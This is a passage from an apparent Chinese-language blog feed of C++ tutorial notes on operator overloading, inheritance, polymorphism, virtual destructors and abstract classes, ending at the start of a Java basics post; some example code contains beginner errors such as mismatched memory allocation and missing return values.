0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">4  + 6i</code></pre><p>注意：</p><p>(1)并不是所有的运算符都能进行运算符重载，比如 . :: .* ?: sizeof 不能进行重载<br>(2)运算符重载后基本语义不变</p><pre><code class="hljs">① 不改变运算符的优先级② 不改变运算符的结合性③ 不改变运算符所需要的操作数④ 不能创建新的运算符</code></pre><h3 id="3-定义运算符重载函数名的步骤"><a href="#3-定义运算符重载函数名的步骤" class="headerlink" title="3.定义运算符重载函数名的步骤"></a><strong>3.定义运算符重载函数名的步骤</strong></h3><p>(1)承认操作符重载是一个函数，写出函数名称<br>(2)根据操作数，写出函数参数<br>(3)根据业务完善函数的返回值，实现函数的业务</p><h3 id="4-二运算符重载的两种方法"><a href="#4-二运算符重载的两种方法" class="headerlink" title="4.二运算符重载的两种方法"></a><strong>4.二运算符重载的两种方法</strong></h3><h4 id="1-友元函数完成二元运算符的重载"><a href="#1-友元函数完成二元运算符的重载" class="headerlink" title="1.友元函数完成二元运算符的重载"></a><strong>1.友元函数完成二元运算符的重载</strong></h4><pre><code class="hljs">Complex operator+(Complex  &amp; c1, Complex &amp; c2);</code></pre><p>调用的时候就要这样调用</p><pre><code class="hljs">Complex c3 =c1 + c2;</code></pre><h4 id="2-成员函数完成二元运算符的重载"><a href="#2-成员函数完成二元运算符的重载" class="headerlink" title="2.成员函数完成二元运算符的重载"></a><strong>2.成员函数完成二元运算符的重载</strong></h4><p>   Complex operator+(Complex &amp; c2);</p><p> 调用的时候要这样引用：</p><pre><code class="hljs"> Complex c3 = c1.operator+(Complex &amp; c2);</code></pre><h3 id="5-一运算符重载的两种方法"><a href="#5-一运算符重载的两种方法" class="headerlink" title="5.一运算符重载的两种方法"></a><strong>5.一运算符重载的两种方法</strong></h3><h4 id="1-友元函数完成一元运算符的重载"><a href="#1-友元函数完成一元运算符的重载" class="headerlink" title="1.友元函数完成一元运算符的重载"></a><strong>1.友元函数完成一元运算符的重载</strong></h4><p>前置++ </p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class Complex&#123;private:    int a;    int b;    friend Complex operator+(Complex &amp; c1, Complex &amp; c2);    friend Complex &amp; operator++(Complex &amp; c1);public:    Complex(int a=0,int b =0)&#123;        this-&gt;a = a;        this-&gt;b = b;    &#125;    void printCom()&#123;        cout &lt;&lt; this-&gt;a &lt;&lt; &quot; + &quot; &lt;&lt; this-&gt;b &lt;&lt; &quot;i&quot; &lt;&lt;endl;    &#125;&#125;;Complex &amp; operator++(Complex &amp; c1)&#123;    c1.a++;    c1.b++;    return c1;&#125;int main() &#123;    Complex c1(1,2),c2(3,4);    ++c1;    c1.printCom();    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">2 + 3i</code></pre><h4 id="2-成员函数完成一元运算符的重载"><a href="#2-成员函数完成一元运算符的重载" class="headerlink" title="2.成员函数完成一元运算符的重载"></a><strong>2.成员函数完成一元运算符的重载</strong></h4><p>前置–</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class Complex&#123;private:    int a;    int b;    friend Complex operator+(Complex &amp; c1, Complex &amp; c2);    friend Complex &amp; operator++(Complex &amp; c1);public:    Complex(int a=0,int b =0)&#123;        this-&gt;a = a;        this-&gt;b = b;    &#125;    void printCom()&#123;        cout &lt;&lt; this-&gt;a &lt;&lt; &quot; + &quot; &lt;&lt; this-&gt;b &lt;&lt; &quot;i&quot; &lt;&lt;endl;    &#125;    Complex &amp; operator--()&#123;        this-&gt;a --;        this-&gt;b --;        return *this;    &#125;&#125;;int main() &#123;    Complex c1(1,2),c2(3,4);    --c1;    c1.printCom();    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">1 + 2i</code></pre><h3 id="6-怎么实现一元运算符后置-–重载"><a href="#6-怎么实现一元运算符后置-–重载" class="headerlink" title="6.怎么实现一元运算符后置++ –重载"></a><strong>6.怎么实现一元运算符后置++ –重载</strong></h3><p>我们知道，后置++ – 是要先运行 在 ++ 或者 –  ，于是我们返回的就不是一个引用而是一个对象，那么是加上和这个和前置 ++ – 就只有返回值不同，所以直接写是会报错的，于是乎，C++ 又给我们提供了一个新的东西叫做 占位符语法</p><p>实际上就是在 参数的最后写上一个 int </p><h4 id="1-友元函数完成一元运算符的重载-1"><a href="#1-友元函数完成一元运算符的重载-1" class="headerlink" title="1.友元函数完成一元运算符的重载"></a><strong>1.友元函数完成一元运算符的重载</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class Complex&#123;private:    int a;    int b;    friend Complex operator++(Complex &amp; c1,int);public:    Complex(int a=0,int b =0)&#123;        this-&gt;a = a;        this-&gt;b = b;    &#125;    void printCom()&#123;        cout &lt;&lt; this-&gt;a &lt;&lt; &quot; + &quot; &lt;&lt; this-&gt;b &lt;&lt; &quot;i&quot; &lt;&lt;endl;    &#125;&#125;;Complex operator++(Complex &amp; c1,int)&#123;    Complex tmp = c1;    c1.a++;    c1.b++;    return tmp;&#125;int main() &#123;    Complex c1(1,2),c2(3,4);    c1++;    c1.printCom();    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">2 + 3i</code></pre><h4 id="2-成员函数完成一元运算符的重载-1"><a href="#2-成员函数完成一元运算符的重载-1" class="headerlink" title="2.成员函数完成一元运算符的重载"></a><strong>2.成员函数完成一元运算符的重载</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class Complex&#123;private:    int a;    int b;    friend Complex operator+(Complex &amp; c1, Complex &amp; c2);    friend Complex &amp; operator++(Complex &amp; c1);    friend Complex operator++(Complex &amp; c1,int);public:    Complex(int a=0,int b =0)&#123;        this-&gt;a = a;        this-&gt;b = b;    &#125;    void printCom()&#123;        cout &lt;&lt; this-&gt;a &lt;&lt; &quot; + &quot; &lt;&lt; this-&gt;b &lt;&lt; &quot;i&quot; &lt;&lt;endl;    &#125;    Complex operator--(int)&#123;        Complex tmp = *this;        this-&gt;a--;        this-&gt;b--;        return tmp;    &#125;&#125;;int main() &#123;    Complex c1(1,2),c2(3,4);    c1--;    c1.printCom();    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">1 + 2i</code></pre><h3 id="7-重载-操作符"><a href="#7-重载-操作符" class="headerlink" title="7.重载 &#x3D; 操作符"></a><strong>7.重载 &#x3D; 操作符</strong></h3><p>我们之前说过，&#x3D; 操作符是默认使用浅拷贝的，我们现在需要重载他，实现我们想要的深拷贝</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &lt;cstring&gt;#include &quot;iostream&quot;using namespace std;class Name&#123;private:    int m_len;    char* m_p;public:    Name(const Name &amp; obj1)&#123;        m_len = obj1.m_len;        m_p = (char*) malloc(m_len+1);        strcpy(m_p,obj1.m_p);    &#125;    ~Name()&#123;        if(m_p != NULL)&#123;            free(m_p);            m_p = NULL;            m_len = 0;        &#125;    &#125;   Name&amp; operator=(Name &amp; obj)&#123;        //先吧旧的内存释放        if(this-&gt;m_p != NULL)&#123;            delete[] m_p;            m_len = 0;        &#125;        //根据obj 分配内存大小        this-&gt;m_len = obj.m_len;        this-&gt;m_p = new char [this-&gt;m_len+1];        //给 obj 赋值        strcpy(m_p,obj.m_p);        return *this;    &#125;&#125;;void objplaymain()&#123;    Name obj1((const Name &amp;) &quot;abcdefg&quot;);    Name obj3((const Name &amp;) &quot;obj3&quot;);    obj3 = obj1;&#125;int main() &#123;    objplaymain();    return 0;&#125;</code></pre><h2 id="十二、继承"><a href="#十二、继承" class="headerlink" title="十二、继承"></a><strong>十二、继承</strong></h2><h3 id="1-继承的基本语法："><a href="#1-继承的基本语法：" class="headerlink" title="1.继承的基本语法："></a><strong>1.继承的基本语法：</strong></h3><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class Parent&#123;private:    int a;    int b;public:    void print()&#123;        cout &lt;&lt; &quot;a : &quot; &lt;&lt; this-&gt;a &lt;&lt;endl;    &#125;&#125;;class Child : protected Parent&#123;private:    int c;&#125;;int main() &#123;    Child C1 ;    return 0;&#125;</code></pre><h3 id="2-继承的重要说明："><a href="#2-继承的重要说明：" class="headerlink" title="2.继承的重要说明："></a><strong>2.继承的重要说明：</strong></h3><p>(1)子类拥有父类的所有成员变量和成员函数<br>(2)子类就是一种特殊的父类<br>(3)子类对象可以当做父类对象使用（多态的概念，当形参是父类的时候，可以传子类进去）<br>(4)子类可以拥有父类没有的方法和属性</p><h3 id="3-类的访问控制："><a href="#3-类的访问控制：" class="headerlink" title="3.类的访问控制："></a><strong>3.类的访问控制：</strong></h3><p>类的继承方式会影响父类里面的属性在子类中的访问控制</p><h4 id="1-以公有的形式去继承父类的属性"><a href="#1-以公有的形式去继承父类的属性" class="headerlink" title="(1)以公有的形式去继承父类的属性"></a><strong>(1)以公有的形式去继承父类的属性</strong></h4><p>所有的访问控制符在子类中保持不变，public 还是public protected 还是 protected private 还是 private 但是要注意，<strong>如果父类是 private 属性，不管子类怎么样的方式继承，都是不能访问父类的成员的</strong></p><h4 id="2-以私有的形式去继承父类的属性"><a href="#2-以私有的形式去继承父类的属性" class="headerlink" title="(2)以私有的形式去继承父类的属性"></a><strong>(2)以私有的形式去继承父类的属性</strong></h4><p>不管父类的访问控制是什么样子的，在子类中都会变成 private </p><h4 id="3-以保护的形式去继承父类的属性"><a href="#3-以保护的形式去继承父类的属性" class="headerlink" title="(3)以保护的形式去继承父类的属性"></a><strong>(3)以保护的形式去继承父类的属性</strong></h4><p>除了 public 方式在子类中变成了 protected 以外，其余保持不变</p><h3 id="4-继承中的构造和析构："><a href="#4-继承中的构造和析构：" class="headerlink" title="4.继承中的构造和析构："></a><strong>4.继承中的构造和析构：</strong></h3><h4 id="1-类型兼容性原则"><a href="#1-类型兼容性原则" class="headerlink" title="1.类型兼容性原则"></a><strong>1.类型兼容性原则</strong></h4><p>类型兼容性原则是指在需要基类对象的任何地方，都可以使用公有派生类的对象来代替，通过公有继承，派生类得到基类中除了构造函数和析构函数之外的所有成员，因公有派生类能解决所有基类能解决的问题。</p><blockquote><p><strong>类型兼容规则中指的替代：</strong></p><p>(1)子类对象能当做父类对象使用<br>(2)子类对象能直接赋值给父类对象<br>(3)子类对象能直接初始化父类对象<br>(4)父类指针能直接指向子类对象<br>(5)父类引用能直接引用子类对象</p></blockquote><h4 id="2-继承中构造和析构的调用原则"><a href="#2-继承中构造和析构的调用原则" class="headerlink" title="2.继承中构造和析构的调用原则"></a><strong>2.继承中构造和析构的调用原则</strong></h4><p><strong>1.首先要知道两个重要的概念：</strong></p><p>(1)在子类对象构造的时候需要调用父类的构造函数对其继承过来的成员进行初始化<br>(2)在子类对象进行析构的时候需要调用父类的析构函数对其继承雇来的对象进行清理</p><p><strong>2.构造和析构的调用原则</strong></p><p>(1)子类对象在创建时首先要调用父类对象的构造方法<br>(2)父类的构造函数执行以后会调用子类的构造函数<br>(3)当父类的构造函数有参数的时候，需要在子类的初始化列表中显示的调用<br>(4)析构函数的调用顺序和构造函数的调用顺序相反</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class Parent&#123;private:    int a;    int b;public:    Parent(int a ,int b)&#123;        this-&gt;a = a;        this-&gt;b = b;        cout &lt;&lt; &quot;父类构造函数&quot; &lt;&lt; endl;    &#125;    void printP()&#123;        cout &lt;&lt; &quot;我是爹&quot; &lt;&lt;endl;    &#125;    ~Parent()&#123;        cout &lt;&lt; &quot;父类析构函数&quot; &lt;&lt; endl;    &#125;&#125;;class Child : public Parent&#123;private:    int c;public:    Child(int a,int b,int c):Parent(a,b)&#123;       this-&gt;c = c;       cout &lt;&lt; &quot;子类构造函数&quot; &lt;&lt; endl;    &#125;    void printC()&#123;        cout &lt;&lt; &quot;我是儿子&quot; &lt;&lt; endl;    &#125;;    ~Child()&#123;        cout &lt;&lt; &quot;子类析构函数&quot; &lt;&lt; endl;    &#125;&#125;;void objplay()&#123;    Child c1(1,2,3);&#125;int main() &#123;    objplay();    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">父类构造函数子类构造函数子类析构函数父类析构函数</code></pre><h4 id="3-继承中同名成员变量的处理方法"><a href="#3-继承中同名成员变量的处理方法" class="headerlink" title="3.继承中同名成员变量的处理方法"></a><strong>3.继承中同名成员变量的处理方法</strong></h4><p>1.当子类成员变量和父类成员变量同名的时候，子类依然从父类中继承同名成员，并且在子类中默认调用的是子类的成员变量，如果想访问父类中的同名变量。请使用域分辨符::<br>2.同名成员存储在内存中的不同位置</p><h4 id="4-派生类中的-static-关键字"><a href="#4-派生类中的-static-关键字" class="headerlink" title="4.派生类中的 static 关键字"></a><strong>4.派生类中的 static 关键字</strong></h4><p>(1)基类定义的静态成员，将被所有的派生类共享<br>(2)派生类中访问静态成员，用一下的形式显示的说明</p><pre><code class="hljs">类名 :: 成员</code></pre><p>或者</p><pre><code class="hljs">对象名.成员</code></pre><h2 id="十三、多继承"><a href="#十三、多继承" class="headerlink" title="十三、多继承"></a><strong>十三、多继承</strong></h2><h3 id="1-最基本的多继承"><a href="#1-最基本的多继承" class="headerlink" title="1.最基本的多继承"></a><strong>1.最基本的多继承</strong></h3><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class Base1&#123;private:    int a;public:    Base1(int a)&#123;        this-&gt;a = a;    &#125;    void print1()&#123;        cout &lt;&lt; &quot;a = &quot; &lt;&lt; this-&gt;a &lt;&lt;endl;    &#125;&#125;;class Base2&#123;private:    int b;public:    Base2(int b)&#123;        this-&gt;b = b;    &#125;    void print2()&#123;        cout &lt;&lt; &quot;b = &quot; &lt;&lt; this-&gt;b &lt;&lt;endl;    &#125;&#125;;class B : public Base1,public Base2&#123;private:    int c;public:    B(int b1,int b2,int c):Base1(b1),Base2(b2)&#123;        this-&gt;c = c;    &#125;    void print3()&#123;        cout &lt;&lt; &quot;c = &quot; &lt;&lt; this-&gt;c &lt;&lt;endl;    &#125;&#125;;int main() &#123;    B b1(1,2,3);    b1.print1();    b1.print2();    b1.print3();    return 0;&#125;</code></pre><h3 id="2-二义性和虚继承的解决方案"><a href="#2-二义性和虚继承的解决方案" class="headerlink" title="2.二义性和虚继承的解决方案"></a><strong>2.二义性和虚继承的解决方案</strong></h3><h3 id="1-虚继承的概念"><a href="#1-虚继承的概念" class="headerlink" title="1.虚继承的概念"></a><strong>1.虚继承的概念</strong></h3><p>如果一个派生类从多个基类派生，而这些基类有一个共同的基类，那么对这个基类中的名字进行访问的时候就会出现二义性，因为最底层的这个类不知道访问的是上面哪个类中的属性（属性都是从最基类中继承的，名字是一样的）</p><p>于是就产生了虚继承的概念，就是在中间的两个类继承最基类的时候加上 :virtual 关键字，这样在中间两个类继承最底层的那个类的时候就不会去继承两次而是一次，这样就不会出现那样的问题了</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class Baseend&#123;public:    int d;    void printBB()&#123;        cout &lt;&lt; &quot;d = &quot; &lt;&lt; this-&gt;d &lt;&lt;endl;    &#125;&#125;;class Base1:virtual public Baseend&#123;private:    int a;public:    Base1(int a)&#123;        this-&gt;a = a;    &#125;    void print1()&#123;        cout &lt;&lt; &quot;a = &quot; &lt;&lt; this-&gt;a &lt;&lt;endl;    &#125;&#125;;class Base2:virtual public Baseend&#123;private:    int b;public:    Base2(int b)&#123;        this-&gt;b = b;    &#125;    void print2()&#123;        cout &lt;&lt; &quot;b = &quot; &lt;&lt; this-&gt;b &lt;&lt;endl;    &#125;&#125;;class B : public Base1,public Base2&#123;private:    int c;public:    B(int b1,int b2,int c):Base1(1),Base2(2)&#123;        this-&gt;c = c;    &#125;    void print3()&#123;        cout &lt;&lt; &quot;c = &quot; &lt;&lt; this-&gt;c &lt;&lt;endl;    &#125;&#125;;int main() &#123;    B b1(1,2,3);    b1.d = 100;    b1.printBB();    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">d = 100</code></pre><h2 id="十四、多态"><a href="#十四、多态" class="headerlink" title="十四、多态"></a><strong>十四、多态</strong></h2><h3 id="1-引言："><a href="#1-引言：" class="headerlink" title="1.引言："></a><strong>1.引言：</strong></h3><p><strong>封装、继承、多态 是面向对象的三大境界，为什么这么说？</strong></p><p>(1)封装打破了函数的框架，将变量和函数结合在一起，可以使用对象的属性和对象的方法<br>(2)继承实现了代码的复用，后来人能使用前人写的代码<br>(3)多态也是代码的复用，只不过多态是更高的层次，实现了复用后人写的代码</p><h3 id="2-问题发现："><a href="#2-问题发现：" class="headerlink" title="2.问题发现："></a><strong>2.问题发现：</strong></h3><p>父类中被重写的函数还是会继承给子类，默认情况下，子类中重写的函数将隐藏父类中的函数，然后我们通过作用于分辨符:: 访问到父类中的函数，</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class A&#123;private:    int a;public:    A(int a)&#123;        this-&gt;a = a;    &#125;    void print()&#123;        cout  &lt;&lt; &quot;父类&quot; &lt;&lt; endl;    &#125;&#125;;class B:public A&#123;private:    int b;public:    B(int b):A(1)&#123;        this-&gt;b = b;    &#125;    void print() &#123;        cout &lt;&lt; &quot;子类&quot; &lt;&lt; endl;    &#125;&#125;;int main()&#123;    B bb(100);    bb.print();&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">子类</code></pre><p><strong>但是我们如果用指针</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class A&#123;private:    int a;public:    A(int a)&#123;        this-&gt;a = a;    &#125;    void print()&#123;        cout  &lt;&lt; &quot;父类&quot; &lt;&lt; endl;    &#125;&#125;;class B:public A&#123;private:    int b;public:    B(int b):A(1)&#123;        this-&gt;b = b;    &#125;    void print() &#123;        cout &lt;&lt; &quot;子类&quot; &lt;&lt; endl;    &#125;&#125;;int main()&#123;    A * pT = NULL;    A p1(20);    B p2(100);    pT = &amp;p1;    pT-&gt;print();    pT = &amp;p2;    pT-&gt;print();&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">父类父类</code></pre><p><strong>解释：</strong></p><p>你会发现指针没法识别子类的函数，始终调用的是父类的函数，这其实也是编译器的一种安全的做法，因为在静态编译的时候编译器无法知道应该调用哪个函数，为了安全于是选择了调用父类的函数，毕竟这个函数肯定没问题</p><h3 id="3-新的需求："><a href="#3-新的需求：" class="headerlink" title="3.新的需求："></a><strong>3.新的需求：</strong></h3><p>我传入一个父类对象，调用的就是父类的函数，我传入的是子类对象，得到的就是子类的函数</p><h3 id="4-面向对象中的多态："><a href="#4-面向对象中的多态：" class="headerlink" title="4.面向对象中的多态："></a><strong>4.面向对象中的多态：</strong></h3><p>根据具体的对象类型决定最终的函数调用目标，也就是同样的调用语句有着不用的表现形态，C++ 为我们提供了多态</p><p>我们只要在父类对应的函数前面写上 virtual，父类写了 virtual 子类就可以不用写（默认已经写好了）</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class A&#123;private:    int a;public:    A(int a)&#123;        this-&gt;a = a;    &#125;    virtual void print()&#123;//注意这里的 virtual        cout  &lt;&lt; &quot;父类&quot; &lt;&lt; endl;    &#125;&#125;;class B:public A&#123;private:    int b;public:    B(int b):A(1)&#123;        this-&gt;b = b;    &#125;    void print() &#123;        cout &lt;&lt; &quot;子类&quot; &lt;&lt; endl;    &#125;&#125;;int main()&#123;    A * pT = NULL;    A p1(20);    B p2(100);    pT = &amp;p1;    pT-&gt;print();    pT = &amp;p2;    pT-&gt;print();&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">父类子类</code></pre><p>有了这种操作以后，我们就能在函数的形参中定义父类指针，传入一个子类地址，然后就能调用子类的方法，正所谓应用未来，这是一种固定的接口，传什么调什么，就是这么厉害</p><h3 id="5-实现多态的三个条件："><a href="#5-实现多态的三个条件：" class="headerlink" title="5.实现多态的三个条件："></a><strong>5.实现多态的三个条件：</strong></h3><p>(1) 要有继承<br>(2) 要有虚函数重写<br>(3) 要有一个固定的平台（父类指针或者父类引用指向子对象）</p><h3 id="6-多态的理论基础："><a href="#6-多态的理论基础：" class="headerlink" title="6.多态的理论基础："></a><strong>6.多态的理论基础：</strong></h3><h4 id="静态联编和动态联编"><a href="#静态联编和动态联编" class="headerlink" title="静态联编和动态联编"></a><strong>静态联编和动态联编</strong></h4><p>1.联编：</p><p>是一个程序块、代码块 之间相互关联的过程</p><p>2.静态联编：</p><p>指的是程序的匹配链接在编译阶段实现（也成为早期匹配），重载函数使用的是就是静态联编、</p><p>3.动态联编：</p><p>指的是程序的联编推迟到运行时进行，又称为晚期联编，switch 和 if 语句就是动态联编的例子</p><p>结合我们多态的例子</p><p>如果我们不写 virtual 关键字将会是静态联编</p><h3 id="7-虚析构函数："><a href="#7-虚析构函数：" class="headerlink" title="7.虚析构函数："></a><strong>7.虚析构函数：</strong></h3><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class A&#123;    public:        A()&#123;        cout &lt;&lt; &quot;A 构造&quot; &lt;&lt; endl;    &#125;    ~A()&#123;        cout &lt;&lt; &quot;A 析构&quot; &lt;&lt; endl;    &#125;;&#125;;class B:public A&#123;public:    B()&#123;        cout &lt;&lt; &quot;B 构造&quot; &lt;&lt; endl;    &#125;    ~B()&#123;        cout &lt;&lt; &quot;B 析构&quot; &lt;&lt; endl;    &#125;;&#125;;class C:public B&#123;public:    C()&#123;        cout &lt;&lt; &quot;C 构造&quot; &lt;&lt; endl;    &#125;    ~C()&#123;        cout &lt;&lt; &quot;C 析构&quot; &lt;&lt; endl;    &#125;;&#125;;void objdele(A* p)&#123;    delete(p);&#125;int main() &#123;    C *myp = new C;    objdele(myp);    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">A 构造B 构造C 构造A 析构</code></pre><p>你会发现我们传进去的是子类的指针，但是调用的却是父类的析构函数，这就造成了内存泄漏。</p><p><strong>为什么？</strong></p><p>原因很简单，下面的这个函数并不满足多态成立的三个条件，也就不能实现多态，因此就是静态联编，根据形参去释放，这里形参是父类，自然也就是父类</p><pre><code class="hljs">void objdele(A* p)&#123;    delete(p);&#125;</code></pre><p><strong>解决：</strong></p><p>我们只要在根类中的析构函数前加一个 virtual 就成了动态联编，就能实现多态了</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class A&#123;    public:        A()&#123;        cout &lt;&lt; &quot;A 构造&quot; &lt;&lt; endl;    &#125;    virtual ~A()&#123;        cout &lt;&lt; &quot;A 析构&quot; &lt;&lt; endl;    &#125;;&#125;;class B:public A&#123;public:    B()&#123;        cout &lt;&lt; &quot;B 构造&quot; &lt;&lt; endl;    &#125;    ~B()&#123;        cout &lt;&lt; &quot;B 析构&quot; &lt;&lt; endl;    &#125;;&#125;;class C:public B&#123;public:    C()&#123;        cout &lt;&lt; &quot;C 构造&quot; &lt;&lt; endl;    &#125;    ~C()&#123;        cout &lt;&lt; &quot;C 析构&quot; &lt;&lt; endl;    &#125;;&#125;;void objdele(A* p)&#123;    delete(p);&#125;int main() &#123;    C *myp = new C;    objdele(myp);    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">A 构造B 构造C 构造C 析构B 析构A 析构</code></pre><h3 id="8-重载与重写和重定义："><a href="#8-重载与重写和重定义：" class="headerlink" title="8.重载与重写和重定义："></a><strong>8.重载与重写和重定义：</strong></h3><h4 id="1-重载"><a href="#1-重载" class="headerlink" title="1.重载"></a><strong>1.重载</strong></h4><p>(1)重载必须在同一个类中进行<br>(2)重载是在编译器编译期间根据参数的类型和个数决定函数的调用<br>(3)子类无法重载父类的函数，名称一样父类的函数将被覆盖，想要调用父类的函数就要显示的使用域控制符</p><h4 id="2-重写"><a href="#2-重写" class="headerlink" title="2.重写"></a><strong>2.重写</strong></h4><p>(1)重写必须发生在父类和子类之间<br>(2)父类与子类中的函数必须有完全相同的原型<br>(3)使用virtual 声明以后会产生多态，如果不使用 virtual 那叫<strong>重定义</strong></p><h2 id="十五、纯虚函数和抽象类"><a href="#十五、纯虚函数和抽象类" class="headerlink" title="十五、纯虚函数和抽象类"></a><strong>十五、纯虚函数和抽象类</strong></h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a><strong>1.概念</strong></h3><p>(1)纯虚函数是一个在基类中声明的函数，但是咋基类中没有定义，并要求任何的派生类都定义自己的版本<br>(2)纯虚函数的说明形式</p><pre><code class="hljs">virtual 类型 函数名(参数) = 0;</code></pre><p>(3)一个具有纯虚函数的基类成为抽象类</p><h3 id="2-注意："><a href="#2-注意：" class="headerlink" title="2.注意："></a><strong>2.注意：</strong></h3><p>(1)抽象类不能建立对象<br>(2)抽象类不能作为返回类型<br>(3)抽象类不能作为参数类型<br>(4)可以声明抽象类的指针<br>(5)可以声明抽象类的引用</p><h3 id="3-一个结合多态的小例子"><a href="#3-一个结合多态的小例子" class="headerlink" title="3.一个结合多态的小例子"></a><strong>3.一个结合多态的小例子</strong></h3><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class Figure&#123;public:    virtual void getArea() = 0;&#125;;class Circle : public Figure&#123;private:    int a;    int b;public:    Circle(int a ,int b)&#123;        this-&gt;a = a;        this-&gt;b = b;    &#125;    virtual void getArea()&#123;        cout &lt;&lt; &quot;圆的面积是 : &quot; &lt;&lt; 3.14*this-&gt;a*this-&gt;a &lt;&lt;endl;    &#125;&#125;;class Tri : public Figure&#123;private:    int a;    int b;public:    Tri(int a ,int b)&#123;        this-&gt;a = a;        this-&gt;b = b;    &#125;    virtual void getArea()&#123;        cout &lt;&lt; &quot;三角的面积是 : &quot; &lt;&lt; 0.5*this-&gt;a*this-&gt;b &lt;&lt;endl;    &#125;&#125;;void objplay(Figure* p)&#123;    p-&gt;getArea();&#125;int main() &#123;    Circle c(10,20);    objplay(&amp;c);    Tri t(20,30);    objplay(&amp;t);    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">圆的面积是 : 314三角的面积是 : 300</code></pre><h3 id="4-抽象类模拟java-的接口"><a href="#4-抽象类模拟java-的接口" class="headerlink" title="4.抽象类模拟java 的接口"></a><strong>4.抽象类模拟java 的接口</strong></h3><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;iostream&quot;using namespace std;class Interface1&#123;public:    virtual int add(int a ,int b) = 0;    virtual void print() = 0;&#125;;class Interface2&#123;public:    virtual int mutl(int a ,int b) = 0;    virtual void print() = 0;&#125;;class Parent&#123;private:    int a;public:    int getA()&#123;        this-&gt;a = 0;        return a;    &#125;&#125;;class Child:public Parent,public Interface1,public Interface2&#123;private:    int a;    int b;public:    Child()&#123;        this-&gt;a = a;        this-&gt;b = b;    &#125;    virtual int add(int a ,int b)&#123;        cout &lt;&lt;  a+b &lt;&lt;endl;    &#125;    virtual void print()&#123;        cout &lt;&lt; &quot;Child print()函数执行&quot; &lt;&lt;endl;    &#125;    virtual int mutl(int a ,int b)&#123;        cout &lt;&lt;  a*b &lt;&lt;endl;     &#125;&#125;;int main() &#123;    Child c1;    Interface1 *t1 = &amp;c1;    t1-&gt;add(1,2);    Interface2 *t2 = &amp;c1;    t2-&gt;mutl(3,4);    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">312</code></pre>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程 C++ 基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA 基础教程</title>
    <link href="/2018/10/08/JAVA%20%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/"/>
    <url>/2018/10/08/JAVA%20%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="一、java-编程分为三个方向"><a href="#一、java-编程分为三个方向" class="headerlink" title="一、java 编程分为三个方向"></a><strong>一、java 编程分为三个方向</strong></h2><p>java se  Java 桌面开发<br>java ee  Java web开发<br>java me  Java 手机开发</p><p>Java se（包括面向对象，数据库编程等） 是 Java ee 的基础，Java ee 的中基部分是 servlet 和 jsp ，这两个属于 MVC 模式，java ee 的高级部分是 struts spring Hibernate Ejb 等，这些都是属于 ssh 框架</p><p>下面这幅图展示了java ee 的最终框架</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/JAVA%20EE%20server%20%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="此处输入图片的描述"></p><span id="more"></span><h2 id="二、一些前置知识"><a href="#二、一些前置知识" class="headerlink" title="二、一些前置知识"></a><strong>二、一些前置知识</strong></h2><h3 id="1、jdk-中包括哪些内容"><a href="#1、jdk-中包括哪些内容" class="headerlink" title="1、jdk 中包括哪些内容"></a><strong>1、jdk 中包括哪些内容</strong></h3><p>(1) jre：java 的运行环境<br>(2) javac.exe java 的编译器<br>(3) java.exe Java 的解释执行器<br>(4) java 的类库  3600 多个类</p><h3 id="2-用一个最简单的程序说话"><a href="#2-用一个最简单的程序说话" class="headerlink" title="2. 用一个最简单的程序说话"></a><strong>2. 用一个最简单的程序说话</strong></h3><pre><code class="hljs">public class hello&#123;public static void main(String args[])&#123;System.out.println(&quot;hello world!&quot;);&#125;&#125;</code></pre><p>(1)public 是公用的意思，在一个文件中只能有一个public 类<br>(2)hello 是类名，公共类的类名必须和文件名保持一致<br>(3)main 是函数的入口</p><h3 id="3-java-编译的一些过程"><a href="#3-java-编译的一些过程" class="headerlink" title="3.java 编译的一些过程"></a><strong>3.java 